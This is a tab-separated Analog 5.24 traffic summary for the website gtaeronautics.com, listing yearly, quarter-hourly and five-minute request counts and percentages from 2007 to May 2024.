x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2024	05	29	02	08
x	FR	2007	12	18	17	05
x	LR	2024	05	28	04	55
x	E7	2024	05	29	02	08
x	SR	1933339
x	S7	7183
x	NC	654105
x	C7	0
x	FL	766570
x	F7	1534
x	RR	254
x	R7	0
x	NH	113099
x	H7	439
x	BT	57520368399
x	B7	0
1	Rr	329133	17.024	2024
1	Rr	511208	26.442	2023
1	Rr	82334	4.259	2022
1	Rr	98917	5.116	2021
1	Rr	89380	4.623	2020
1	Rr	80088	4.142	2019
1	Rr	68927	3.565	2018
1	Rr	60168	3.112	2017
1	Rr	73316	3.792	2016
1	Rr	80796	4.179	2015
1	Rr	110773	5.730	2014
1	Rr	65173	3.371	2013
1	Rr	60742	3.142	2012
1	Rr	57015	2.949	2011
1	Rr	22139	1.145	2010
1	Rr	69710	3.606	2009
1	Rr	71820	3.715	2008
1	Rr	1700	0.088	2007
1	*BT	R	511208	2023
4	Rr	0	0.000	2024	05	27	10	00
4	Rr	1	0.000	2024	05	27	09	45
4	Rr	3	0.000	2024	05	27	09	30
4	Rr	1	0.000	2024	05	27	09	15
4	Rr	1	0.000	2024	05	27	09	00
4	Rr	0	0.000	2024	05	27	08	45
4	Rr	4	0.000	2024	05	27	08	30
4	Rr	1	0.000	2024	05	27	08	15
4	Rr	0	0.000	2024	05	27	08	00
4	Rr	1	0.000	2024	05	27	07	45
4	Rr	0	0.000	2024	05	27	07	30
4	Rr	3	0.000	2024	05	27	07	15
4	Rr	0	0.000	2024	05	27	07	00
4	Rr	2	0.000	2024	05	27	06	45
4	Rr	5	0.000	2024	05	27	06	30
4	Rr	2	0.000	2024	05	27	06	15
4	Rr	2	0.000	2024	05	27	06	00
4	Rr	0	0.000	2024	05	27	05	45
4	Rr	42	0.002	2024	05	27	05	30
4	Rr	52	0.003	2024	05	27	05	15
4	Rr	1	0.000	2024	05	27	05	00
4	Rr	2	0.000	2024	05	27	04	45
4	*BT	R	1068	2024	05	06	16	00
6	Rr	20361	1.053	00	00
6	Rr	17623	0.912	00	15
6	Rr	19198	0.993	00	30
6	Rr	18461	0.955	00	45
6	Rr	16297	0.843	01	00
6	Rr	17986	0.930	01	15
6	Rr	17217	0.891	01	30
6	Rr	18885	0.977	01	45
6	Rr	15768	0.816	02	00
6	Rr	19431	1.005	02	15
6	Rr	19085	0.987	02	30
6	Rr	18383	0.951	02	45
6	Rr	17782	0.920	03	00
6	Rr	17660	0.913	03	15
6	Rr	18057	0.934	03	30
6	Rr	20808	1.076	03	45
6	Rr	17712	0.916	04	00
6	Rr	16563	0.857	04	15
6	Rr	18518	0.958	04	30
6	Rr	19752	1.022	04	45
6	Rr	16790	0.868	05	00
6	Rr	18822	0.974	05	15
6	Rr	17348	0.897	05	30
6	Rr	17997	0.931	05	45
6	Rr	17524	0.906	06	00
6	Rr	15854	0.820	06	15
6	Rr	18426	0.953	06	30
6	Rr	15117	0.782	06	45
6	Rr	16200	0.838	07	00
6	Rr	16704	0.864	07	15
6	Rr	16339	0.845	07	30
6	Rr	15598	0.807	07	45
6	Rr	15575	0.806	08	00
6	Rr	15548	0.804	08	15
6	Rr	16768	0.867	08	30
6	Rr	14718	0.761	08	45
6	Rr	14913	0.771	09	00
6	Rr	15657	0.810	09	15
6	Rr	16710	0.864	09	30
6	Rr	14332	0.741	09	45
6	Rr	14926	0.772	10	00
6	Rr	15457	0.799	10	15
6	Rr	18424	0.953	10	30
6	Rr	16160	0.836	10	45
6	Rr	17851	0.923	11	00
6	Rr	16895	0.874	11	15
6	Rr	16925	0.875	11	30
6	Rr	15001	0.776	11	45
6	Rr	17537	0.907	12	00
6	Rr	15806	0.818	12	15
6	Rr	16000	0.828	12	30
6	Rr	17414	0.901	12	45
6	Rr	17734	0.917	13	00
6	Rr	19399	1.003	13	15
6	Rr	19004	0.983	13	30
6	Rr	17572	0.909	13	45
6	Rr	21890	1.132	14	00
6	Rr	23984	1.241	14	15
6	Rr	22899	1.184	14	30
6	Rr	21477	1.111	14	45
6	Rr	22652	1.172	15	00
6	Rr	22260	1.151	15	15
6	Rr	24382	1.261	15	30
6	Rr	24464	1.265	15	45
6	Rr	27589	1.427	16	00
6	Rr	27143	1.404	16	15
6	Rr	25060	1.296	16	30
6	Rr	25912	1.340	16	45
6	Rr	28401	1.469	17	00
6	Rr	25731	1.331	17	15
6	Rr	26108	1.350	17	30
6	Rr	25445	1.316	17	45
6	Rr	28345	1.466	18	00
6	Rr	25354	1.311	18	15
6	Rr	27212	1.408	18	30
6	Rr	26885	1.391	18	45
6	Rr	27681	1.432	19	00
6	Rr	23875	1.235	19	15
6	Rr	25219	1.304	19	30
6	Rr	28677	1.483	19	45
6	Rr	25110	1.299	20	00
6	Rr	25931	1.341	20	15
6	Rr	24602	1.273	20	30
6	Rr	24713	1.278	20	45
6	Rr	23827	1.232	21	00
6	Rr	24351	1.260	21	15
6	Rr	21584	1.116	21	30
6	Rr	23043	1.192	21	45
6	Rr	20316	1.051	22	00
6	Rr	22585	1.168	22	15
6	Rr	21584	1.116	22	30
6	Rr	21937	1.135	22	45
6	Rr	21866	1.131	23	00
6	Rr	22942	1.187	23	15
6	Rr	17274	0.893	23	30
6	Rr	18437	0.954	23	45
5	Rr	3	0.000	2024	05	28	04	35
5	Rr	0	0.000	2024	05	28	04	30
5	Rr	0	0.000	2024	05	28	04	25
5	Rr	0	0.000	2024	05	28	04	20
5	Rr	0	0.000	2024	05	28	04	15
5	Rr	0	0.000	2024	05	28	04	10
5	Rr	1	0.000	2024	05	28	04	05
5	Rr	0	0.000	2024	05	28	04	00
5	Rr	0	0.000	2024	05	28	03	55
5	Rr	0	0.000	2024	05	28	03	50
5	Rr	0	0.000	2024	05	28	03	45
5	Rr	2	0.000	2024	05	28	03	40
5	Rr	0	0.000	2024	05	28	03	35
5	Rr	0	0.000	2024	05	28	03	30
5	Rr	0	0.000	2024	05	28	03	25
5	Rr	0	0.000	2024	05	28	03	20
5	Rr	0	0.000	2024	05	28	03	15
5	Rr	0	0.000	2024	05	28	03	10
5	Rr	0	0.000	2024	05	28	03	05
5	Rr	0	0.000	2024	05	28	03	00
5	Rr	2	0.000	2024	05	28	02	55
5	Rr	4	0.000	2024	05	28	02	50
5	Rr	0	0.000	2024	05	28	02	45
5	Rr	0	0.000	2024	05	28	02	40
5	Rr	0	0.000	2024	05	28	02	35
5	Rr	0	0.000	2024	05	28	02	30
5	Rr	0	0.000	2024	05	28	02	25
5	Rr	18	0.001	2024	05	28	02	20
5	Rr	0	0.000	2024	05	28	02	15
5	Rr	31	0.002	2024	05	28	02	10
5	Rr	112	0.006	2024	05	28	02	05
5	Rr	0	0.000	2024	05	28	02	00
5	Rr	0	0.000	2024	05	28	01	55
5	Rr	0	0.000	2024	05	28	01	50
5	Rr	0	0.000	2024	05	28	01	45
5	Rr	1	0.000	2024	05	28	01	40
5	Rr	0	0.000	2024	05	28	01	35
5	Rr	0	0.000	2024	05	28	01	30
5	Rr	2	0.000	2024	05	28	01	25
5	Rr	0	0.000	2024	05	28	01	20
5	Rr	0	0.000	2024	05	28	01	15
5	Rr	0	0.000	2024	05	28	01	10
5	Rr	0	0.000	2024	05	28	01	05
5	Rr	1	0.000	2024	05	28	01	00
5	Rr	2	0.000	2024	05	28	00	55
5	Rr	4	0.000	2024	05	28	00	50
5	Rr	2	0.000	2024	05	28	00	45
5	Rr	0	0.000	2024	05	28	00	40
5	Rr	0	0.000	2024	05	28	00	35
5	Rr	1	0.000	2024	05	28	00	30
5	Rr	0	0.000	2024	05	28	00	25
5	Rr	0	0.000	2024	05	28	00	20
5	Rr	0	0.000	2024	05	28	00	15
5	Rr	2	0.000	2024	05	28	00	10
5	Rr	1	0.000	2024	05	28	00	05
5	Rr	0	0.000	2024	05	28	00	00
5	Rr	1	0.000	2024	05	27	23	55
5	Rr	0	0.000	2024	05	27	23	50
5	Rr	1	0.000	2024	05	27	23	45
5	Rr	0	0.000	2024	05	27	23	40
5	Rr	0	0.000	2024	05	27	23	35
5	Rr	0	0.000	2024	05	27	23	30
5	Rr	0	0.000	2024	05	27	23	25
5	Rr	0	0.000	2024	05	27	23	20
5	Rr	0	0.000	2024	05	27	23	15
5	Rr	1	0.000	2024	05	27	23	10
5	Rr	0	0.000	2024	05	27	23	05
5	Rr	0	0.000	2024	05	27	23	00
5	Rr	0	0.000	2024	05	27	22	55
5	Rr	0	0.000	2024	05	27	22	50
5	Rr	0	0.000	2024	05	27	22	45
5	Rr	0	0.000	2024	05	27	22	40
5	Rr	2	0.000	2024	05	27	22	35
5	Rr	6	0.000	2024	05	27	22	30
5	Rr	2	0.000	2024	05	27	22	25
5	Rr	0	0.000	2024	05	27	22	20
5	Rr	0	0.000	2024	05	27	22	15
5	Rr	0	0.000	2024	05	27	22	10
5	Rr	1	0.000	2024	05	27	22	05
5	Rr	0	0.000	2024	05	27	22	00
5	Rr	2	0.000	2024	05	27	21	55
5	Rr	0	0.000	2024	05	27	21	50
5	Rr	0	0.000	2024	05	27	21	45
5	Rr	0	0.000	2024	05	27	21	40
5	Rr	0	0.000	2024	05	27	21	35
5	Rr	0	0.000	2024	05	27	21	30
5	Rr	0	0.000	2024	05	27	21	25
5	Rr	0	0.000	2024	05	27	21	20
5	Rr	1	0.000	2024	05	27	21	15
5	Rr	0	0.000	2024	05	27	21	10
5	Rr	0	0.000	2024	05	27	21	05
5	Rr	0	0.000	2024	05	27	21	00
5	Rr	0	0.000	2024	05	27	20	55
5	Rr	0	0.000	2024	05	27	20	50
5	Rr	0	0.000	2024	05	27	20	45
5	Rr	0	0.000	2024	05	27	20	40
5	Rr	0	0.000	2024	05	27	20	35
5	Rr	0	0.000	2024	05	27	20	30
5	Rr	0	0.000	2024	05	27	20	25
5	Rr	0	0.000	2024	05	27	20	20
5	Rr	0	0.000	2024	05	27	20	15
5	Rr	0	0.000	2024	05	27	20	10
5	Rr	0	0.000	2024	05	27	20	05
5	Rr	0	0.000	2024	05	27	20	00
5	Rr	0	0.000	2024	05	27	19	55
5	Rr	0	0.000	2024	05	27	19	50
5	Rr	2	0.000	2024	05	27	19	45
5	Rr	1	0.000	2024	05	27	19	40
5	Rr	1	0.000	2024	05	27	19	35
5	Rr	0	0.000	2024	05	27	19	30
5	Rr	1	0.000	2024	05	27	19	25
5	Rr	0	0.000	2024	05	27	19	20
5	Rr	0	0.000	2024	05	27	19	15
5	Rr	0	0.000	2024	05	27	19	10
5	Rr	0	0.000	2024	05	27	19	05
5	Rr	3	0.000	2024	05	27	19	00
5	Rr	0	0.000	2024	05	27	18	55
5	Rr	0	0.000	2024	05	27	18	50
5	Rr	0	0.000	2024	05	27	18	45
5	Rr	0	0.000	2024	05	27	18	40
5	Rr	1	0.000	2024	05	27	18	35
5	Rr	0	0.000	2024	05	27	18	30
5	Rr	0	0.000	2024	05	27	18	25
5	Rr	1	0.000	2024	05	27	18	20
5	Rr	1	0.000	2024	05	27	18	15
5	Rr	0	0.000	2024	05	27	18	10
5	Rr	0	0.000	2024	05	27	18	05
5	Rr	0	0.000	2024	05	27	18	00
5	Rr	1	0.000	2024	05	27	17	55
5	Rr	0	0.000	2024	05	27	17	50
5	Rr	1	0.000	2024	05	27	17	45
5	Rr	0	0.000	2024	05	27	17	40
5	Rr	0	0.000	2024	05	27	17	35
5	Rr	0	0.000	2024	05	27	17	30
5	Rr	0	0.000	2024	05	27	17	25
5	Rr	4	0.000	2024	05	27	17	20
5	Rr	0	0.000	2024	05	27	17	15
5	Rr	0	0.000	2024	05	27	17	10
5	Rr	0	0.000	2024	05	27	17	05
5	Rr	0	0.000	2024	05	27	17	00
5	Rr	0	0.000	2024	05	27	16	55
5	Rr	0	0.000	2024	05	27	16	50
5	Rr	0	0.000	2024	05	27	16	45
5	Rr	0	0.000	2024	05	27	16	40
5	Rr	0	0.000	2024	05	27	16	35
5	Rr	0	0.000	2024	05	27	16	30
5	Rr	4	0.000	2024	05	27	16	25
5	Rr	0	0.000	2024	05	27	16	20
5	Rr	0	0.000	2024	05	27	16	15
5	Rr	0	0.000	2024	05	27	16	10
5	Rr	0	0.000	2024	05	27	16	05
5	Rr	1	0.000	2024	05	27	16	00
5	Rr	0	0.000	2024	05	27	15	55
5	Rr	0	0.000	2024	05	27	15	50
5	Rr	1	0.000	2024	05	27	15	45
5	Rr	0	0.000	2024	05	27	15	40
5	Rr	2	0.000	2024	05	27	15	35
5	Rr	36	0.002	2024	05	27	15	30
5	Rr	1	0.000	2024	05	27	15	25
5	Rr	5	0.000	2024	05	27	15	20
5	Rr	2	0.000	2024	05	27	15	15
5	Rr	0	0.000	2024	05	27	15	10
5	Rr	0	0.000	2024	05	27	15	05
5	Rr	0	0.000	2024	05	27	15	00
5	Rr	0	0.000	2024	05	27	14	55
5	Rr	0	0.000	2024	05	27	14	50
5	Rr	1	0.000	2024	05	27	14	45
5	Rr	0	0.000	2024	05	27	14	40
5	Rr	0	0.000	2024	05	27	14	35
5	Rr	0	0.000	2024	05	27	14	30
5	Rr	0	0.000	2024	05	27	14	25
5	Rr	0	0.000	2024	05	27	14	20
5	Rr	0	0.000	2024	05	27	14	15
5	Rr	1	0.000	2024	05	27	14	10
5	Rr	36	0.002	2024	05	27	14	05
5	Rr	0	0.000	2024	05	27	14	00
5	Rr	0	0.000	2024	05	27	13	55
5	Rr	0	0.000	2024	05	27	13	50
5	Rr	1	0.000	2024	05	27	13	45
5	Rr	0	0.000	2024	05	27	13	40
5	Rr	0	0.000	2024	05	27	13	35
5	Rr	2	0.000	2024	05	27	13	30
5	Rr	0	0.000	2024	05	27	13	25
5	Rr	0	0.000	2024	05	27	13	20
5	Rr	0	0.000	2024	05	27	13	15
5	Rr	0	0.000	2024	05	27	13	10
5	Rr	0	0.000	2024	05	27	13	05
5	Rr	2	0.000	2024	05	27	13	00
5	Rr	1	0.000	2024	05	27	12	55
5	Rr	0	0.000	2024	05	27	12	50
5	Rr	1	0.000	2024	05	27	12	45
5	Rr	0	0.000	2024	05	27	12	40
5	Rr	0	0.000	2024	05	27	12	35
5	Rr	0	0.000	2024	05	27	12	30
5	Rr	0	0.000	2024	05	27	12	25
5	Rr	0	0.000	2024	05	27	12	20
5	Rr	0	0.000	2024	05	27	12	15
5	Rr	0	0.000	2024	05	27	12	10
5	Rr	5	0.000	2024	05	27	12	05
5	Rr	1	0.000	2024	05	27	12	00
5	Rr	0	0.000	2024	05	27	11	55
5	Rr	0	0.000	2024	05	27	11	50
5	Rr	3	0.000	2024	05	27	11	45
5	Rr	6	0.000	2024	05	27	11	40
5	Rr	0	0.000	2024	05	27	11	35
5	Rr	0	0.000	2024	05	27	11	30
5	Rr	0	0.000	2024	05	27	11	25
5	Rr	0	0.000	2024	05	27	11	20
5	Rr	0	0.000	2024	05	27	11	15
5	Rr	0	0.000	2024	05	27	11	10
5	Rr	0	0.000	2024	05	27	11	05
5	Rr	0	0.000	2024	05	27	11	00
5	Rr	0	0.000	2024	05	27	10	55
5	Rr	0	0.000	2024	05	27	10	50
5	Rr	0	0.000	2024	05	27	10	45
5	Rr	0	0.000	2024	05	27	10	40
5	Rr	1	0.000	2024	05	27	10	35
5	Rr	0	0.000	2024	05	27	10	30
5	Rr	0	0.000	2024	05	27	10	25
5	Rr	0	0.000	2024	05	27	10	20
5	Rr	0	0.000	2024	05	27	10	15
5	Rr	0	0.000	2024	05	27	10	10
5	Rr	0	0.000	2024	05	27	10	05
5	Rr	0	0.000	2024	05	27	10	00
5	Rr	0	0.000	2024	05	27	09	55
5	Rr	0	0.000	2024	05	27	09	50
5	Rr	1	0.000	2024	05	27	09	45
5	Rr	1	0.000	2024	05	27	09	40
5	Rr	2	0.000	2024	05	27	09	35
5	Rr	0	0.000	2024	05	27	09	30
5	Rr	1	0.000	2024	05	27	09	25
5	Rr	0	0.000	2024	05	27	09	20
5	Rr	0	0.000	2024	05	27	09	15
5	Rr	0	0.000	2024	05	27	09	10
5	Rr	0	0.000	2024	05	27	09	05
5	Rr	1	0.000	2024	05	27	09	00
5	Rr	0	0.000	2024	05	27	08	55
5	Rr	0	0.000	2024	05	27	08	50
5	Rr	0	0.000	2024	05	27	08	45
5	Rr	3	0.000	2024	05	27	08	40
5	Rr	1	0.000	2024	05	27	08	35
5	Rr	0	0.000	2024	05	27	08	30
5	Rr	0	0.000	2024	05	27	08	25
5	Rr	0	0.000	2024	05	27	08	20
5	Rr	1	0.000	2024	05	27	08	15
5	Rr	0	0.000	2024	05	27	08	10
5	Rr	0	0.000	2024	05	27	08	05
5	Rr	0	0.000	2024	05	27	08	00
5	Rr	0	0.000	2024	05	27	07	55
5	Rr	1	0.000	2024	05	27	07	50
5	Rr	0	0.000	2024	05	27	07	45
5	Rr	0	0.000	2024	05	27	07	40
5	Rr	0	0.000	2024	05	27	07	35
5	Rr	0	0.000	2024	05	27	07	30
5	Rr	2	0.000	2024	05	27	07	25
5	Rr	1	0.000	2024	05	27	07	20
5	Rr	0	0.000	2024	05	27	07	15
5	Rr	0	0.000	2024	05	27	07	10
5	Rr	0	0.000	2024	05	27	07	05
5	Rr	0	0.000	2024	05	27	07	00
5	Rr	2	0.000	2024	05	27	06	55
5	Rr	0	0.000	2024	05	27	06	50
5	Rr	0	0.000	2024	05	27	06	45
5	Rr	5	0.000	2024	05	27	06	40
5	Rr	0	0.000	2024	05	27	06	35
5	Rr	0	0.000	2024	05	27	06	30
5	Rr	0	0.000	2024	05	27	06	25
5	Rr	1	0.000	2024	05	27	06	20
5	Rr	1	0.000	2024	05	27	06	15
5	Rr	0	0.000	2024	05	27	06	10
5	Rr	1	0.000	2024	05	27	06	05
5	Rr	1	0.000	2024	05	27	06	00
5	Rr	0	0.000	2024	05	27	05	55
5	Rr	0	0.000	2024	05	27	05	50
5	Rr	0	0.000	2024	05	27	05	45
5	Rr	35	0.002	2024	05	27	05	40
5	Rr	1	0.000	2024	05	27	05	35
5	Rr	6	0.000	2024	05	27	05	30
5	Rr	52	0.003	2024	05	27	05	25
5	Rr	0	0.000	2024	05	27	05	20
5	Rr	0	0.000	2024	05	27	05	15
5	Rr	0	0.000	2024	05	27	05	10
5	Rr	1	0.000	2024	05	27	05	05
5	Rr	0	0.000	2024	05	27	05	00
5	Rr	2	0.000	2024	05	27	04	55
5	Rr	0	0.000	2024	05	27	04	50
5	Rr	0	0.000	2024	05	27	04	45
5	Rr	0	0.000	2024	05	27	04	40
5	*BT	R	945	2023	05	08	18	00
7	Rr	6488	0.336	00	00
7	Rr	6773	0.350	00	05
7	Rr	7100	0.367	00	10
7	Rr	4701	0.243	00	15
7	Rr	5681	0.294	00	20
7	Rr	7241	0.375	00	25
7	Rr	5730	0.296	00	30
7	Rr	7384	0.382	00	35
7	Rr	6084	0.315	00	40
7	Rr	5783	0.299	00	45
7	Rr	6431	0.333	00	50
7	Rr	6247	0.323	00	55
7	Rr	5921	0.306	01	00
7	Rr	5218	0.270	01	05
7	Rr	5158	0.267	01	10
7	Rr	5643	0.292	01	15
7	Rr	6459	0.334	01	20
7	Rr	5884	0.304	01	25
7	Rr	5420	0.280	01	30
7	Rr	5615	0.290	01	35
7	Rr	6182	0.320	01	40
7	Rr	5875	0.304	01	45
7	Rr	6925	0.358	01	50
7	Rr	6085	0.315	01	55
7	Rr	5300	0.274	02	00
7	Rr	5225	0.270	02	05
7	Rr	5243	0.271	02	10
7	Rr	7388	0.382	02	15
7	Rr	5734	0.297	02	20
7	Rr	6309	0.326	02	25
7	Rr	6969	0.360	02	30
7	Rr	6004	0.311	02	35
7	Rr	6112	0.316	02	40
7	Rr	5957	0.308	02	45
7	Rr	6028	0.312	02	50
7	Rr	6398	0.331	02	55
7	Rr	6173	0.319	03	00
7	Rr	5837	0.302	03	05
7	Rr	5772	0.299	03	10
7	Rr	5678	0.294	03	15
7	Rr	6151	0.318	03	20
7	Rr	5831	0.302	03	25
7	Rr	5940	0.307	03	30
7	Rr	5770	0.298	03	35
7	Rr	6347	0.328	03	40
7	Rr	6348	0.328	03	45
7	Rr	7888	0.408	03	50
7	Rr	6572	0.340	03	55
7	Rr	5597	0.289	04	00
7	Rr	6160	0.319	04	05
7	Rr	5955	0.308	04	10
7	Rr	5717	0.296	04	15
7	Rr	5215	0.270	04	20
7	Rr	5631	0.291	04	25
7	Rr	5694	0.295	04	30
7	Rr	5870	0.304	04	35
7	Rr	6954	0.360	04	40
7	Rr	6284	0.325	04	45
7	Rr	6800	0.352	04	50
7	Rr	6668	0.345	04	55
7	Rr	5777	0.299	05	00
7	Rr	5665	0.293	05	05
7	Rr	5348	0.277	05	10
7	Rr	7108	0.368	05	15
7	Rr	6104	0.316	05	20
7	Rr	5610	0.290	05	25
7	Rr	5497	0.284	05	30
7	Rr	5794	0.300	05	35
7	Rr	6057	0.313	05	40
7	Rr	6542	0.338	05	45
7	Rr	5426	0.281	05	50
7	Rr	6029	0.312	05	55
7	Rr	5097	0.264	06	00
7	Rr	6252	0.323	06	05
7	Rr	6175	0.319	06	10
7	Rr	5999	0.310	06	15
7	Rr	4608	0.238	06	20
7	Rr	5247	0.271	06	25
7	Rr	6701	0.347	06	30
7	Rr	6432	0.333	06	35
7	Rr	5293	0.274	06	40
7	Rr	5120	0.265	06	45
7	Rr	5506	0.285	06	50
7	Rr	4491	0.232	06	55
7	Rr	6415	0.332	07	00
7	Rr	4679	0.242	07	05
7	Rr	5106	0.264	07	10
7	Rr	4873	0.252	07	15
7	Rr	5740	0.297	07	20
7	Rr	6091	0.315	07	25
7	Rr	6128	0.317	07	30
7	Rr	5170	0.267	07	35
7	Rr	5041	0.261	07	40
7	Rr	5830	0.302	07	45
7	Rr	4444	0.230	07	50
7	Rr	5324	0.275	07	55
7	Rr	5256	0.272	08	00
7	Rr	5025	0.260	08	05
7	Rr	5294	0.274	08	10
7	Rr	5190	0.268	08	15
7	Rr	5042	0.261	08	20
7	Rr	5316	0.275	08	25
7	Rr	5229	0.270	08	30
7	Rr	5289	0.274	08	35
7	Rr	6250	0.323	08	40
7	Rr	5253	0.272	08	45
7	Rr	4719	0.244	08	50
7	Rr	4746	0.245	08	55
7	Rr	4593	0.238	09	00
7	Rr	5083	0.263	09	05
7	Rr	5237	0.271	09	10
7	Rr	3981	0.206	09	15
7	Rr	5047	0.261	09	20
7	Rr	6629	0.343	09	25
7	Rr	4754	0.246	09	30
7	Rr	6048	0.313	09	35
7	Rr	5908	0.306	09	40
7	Rr	5164	0.267	09	45
7	Rr	4569	0.236	09	50
7	Rr	4599	0.238	09	55
7	Rr	5269	0.273	10	00
7	Rr	4462	0.231	10	05
7	Rr	5195	0.269	10	10
7	Rr	4576	0.237	10	15
7	Rr	5388	0.279	10	20
7	Rr	5493	0.284	10	25
7	Rr	6089	0.315	10	30
7	Rr	5930	0.307	10	35
7	Rr	6405	0.331	10	40
7	Rr	5019	0.260	10	45
7	Rr	6182	0.320	10	50
7	Rr	4959	0.256	10	55
7	Rr	6719	0.348	11	00
7	Rr	5729	0.296	11	05
7	Rr	5403	0.279	11	10
7	Rr	5456	0.282	11	15
7	Rr	5030	0.260	11	20
7	Rr	6409	0.331	11	25
7	Rr	7125	0.369	11	30
7	Rr	4673	0.242	11	35
7	Rr	5127	0.265	11	40
7	Rr	5281	0.273	11	45
7	Rr	4831	0.250	11	50
7	Rr	4889	0.253	11	55
7	Rr	5664	0.293	12	00
7	Rr	6145	0.318	12	05
7	Rr	5728	0.296	12	10
7	Rr	5075	0.262	12	15
7	Rr	5181	0.268	12	20
7	Rr	5550	0.287	12	25
7	Rr	5325	0.275	12	30
7	Rr	5675	0.294	12	35
7	Rr	5000	0.259	12	40
7	Rr	5458	0.282	12	45
7	Rr	6228	0.322	12	50
7	Rr	5728	0.296	12	55
7	Rr	6347	0.328	13	00
7	Rr	5221	0.270	13	05
7	Rr	6166	0.319	13	10
7	Rr	6588	0.341	13	15
7	Rr	6765	0.350	13	20
7	Rr	6046	0.313	13	25
7	Rr	5731	0.296	13	30
7	Rr	6511	0.337	13	35
7	Rr	6762	0.350	13	40
7	Rr	5154	0.267	13	45
7	Rr	6587	0.341	13	50
7	Rr	5831	0.302	13	55
7	Rr	7960	0.412	14	00
7	Rr	6803	0.352	14	05
7	Rr	7127	0.369	14	10
7	Rr	8264	0.427	14	15
7	Rr	7939	0.411	14	20
7	Rr	7781	0.402	14	25
7	Rr	7800	0.403	14	30
7	Rr	7744	0.401	14	35
7	Rr	7355	0.380	14	40
7	Rr	7345	0.380	14	45
7	Rr	6306	0.326	14	50
7	Rr	7826	0.405	14	55
7	Rr	7760	0.401	15	00
7	Rr	7278	0.376	15	05
7	Rr	7614	0.394	15	10
7	Rr	6789	0.351	15	15
7	Rr	8341	0.431	15	20
7	Rr	7130	0.369	15	25
7	Rr	7813	0.404	15	30
7	Rr	7554	0.391	15	35
7	Rr	9015	0.466	15	40
7	Rr	6668	0.345	15	45
7	Rr	8488	0.439	15	50
7	Rr	9308	0.481	15	55
7	Rr	8567	0.443	16	00
7	Rr	9388	0.486	16	05
7	Rr	9634	0.498	16	10
7	Rr	9650	0.499	16	15
7	Rr	8903	0.460	16	20
7	Rr	8590	0.444	16	25
7	Rr	8158	0.422	16	30
7	Rr	9026	0.467	16	35
7	Rr	7876	0.407	16	40
7	Rr	8913	0.461	16	45
7	Rr	9280	0.480	16	50
7	Rr	7719	0.399	16	55
7	Rr	9395	0.486	17	00
7	Rr	9993	0.517	17	05
7	Rr	9013	0.466	17	10
7	Rr	7953	0.411	17	15
7	Rr	9103	0.471	17	20
7	Rr	8675	0.449	17	25
7	Rr	9325	0.482	17	30
7	Rr	8263	0.427	17	35
7	Rr	8520	0.441	17	40
7	Rr	8340	0.431	17	45
7	Rr	8462	0.438	17	50
7	Rr	8643	0.447	17	55
7	Rr	10444	0.540	18	00
7	Rr	9149	0.473	18	05
7	Rr	8752	0.453	18	10
7	Rr	9415	0.487	18	15
7	Rr	8016	0.415	18	20
7	Rr	7923	0.410	18	25
7	Rr	8872	0.459	18	30
7	Rr	7498	0.388	18	35
7	Rr	10842	0.561	18	40
7	Rr	8205	0.424	18	45
7	Rr	9938	0.514	18	50
7	Rr	8742	0.452	18	55
7	Rr	9962	0.515	19	00
7	Rr	8444	0.437	19	05
7	Rr	9275	0.480	19	10
7	Rr	8043	0.416	19	15
7	Rr	7513	0.389	19	20
7	Rr	8319	0.430	19	25
7	Rr	8062	0.417	19	30
7	Rr	9690	0.501	19	35
7	Rr	7467	0.386	19	40
7	Rr	9299	0.481	19	45
7	Rr	9389	0.486	19	50
7	Rr	9989	0.517	19	55
7	Rr	8542	0.442	20	00
7	Rr	8545	0.442	20	05
7	Rr	8023	0.415	20	10
7	Rr	7532	0.390	20	15
7	Rr	9532	0.493	20	20
7	Rr	8867	0.459	20	25
7	Rr	8166	0.422	20	30
7	Rr	9027	0.467	20	35
7	Rr	7409	0.383	20	40
7	Rr	8609	0.445	20	45
7	Rr	8885	0.460	20	50
7	Rr	7219	0.373	20	55
7	Rr	8327	0.431	21	00
7	Rr	8118	0.420	21	05
7	Rr	7382	0.382	21	10
7	Rr	7903	0.409	21	15
7	Rr	8202	0.424	21	20
7	Rr	8246	0.427	21	25
7	Rr	6736	0.348	21	30
7	Rr	7753	0.401	21	35
7	Rr	7095	0.367	21	40
7	Rr	8975	0.464	21	45
7	Rr	7991	0.413	21	50
7	Rr	6077	0.314	21	55
7	Rr	6290	0.325	22	00
7	Rr	6528	0.338	22	05
7	Rr	7498	0.388	22	10
7	Rr	7637	0.395	22	15
7	Rr	7631	0.395	22	20
7	Rr	7317	0.378	22	25
7	Rr	7583	0.392	22	30
7	Rr	7725	0.400	22	35
7	Rr	6276	0.325	22	40
7	Rr	7572	0.392	22	45
7	Rr	7361	0.381	22	50
7	Rr	7004	0.362	22	55
